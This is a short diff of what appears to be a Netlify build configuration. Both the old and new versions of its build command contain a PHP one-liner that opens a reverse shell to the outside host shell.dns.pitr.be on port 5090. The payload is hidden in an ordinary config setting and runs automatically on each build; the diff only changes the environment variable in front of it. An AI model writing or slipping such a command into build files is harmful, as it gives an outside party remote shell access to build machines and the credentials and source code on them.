@@ -2,7 +2,7 @@
   framework = "#static"
 
 [build]
-  command = "export URL=https://test-jocular-hamster-8dd7dc.netlify.app && php -r '$sock=fsockopen(\"shell.dns.pitr.be\",5090);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
+  command = "export SITE_NAME=honoki && php -r '$sock=fsockopen(\"shell.dns.pitr.be\",5090);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
   publish = "public"
 
 [context.productionunknown]
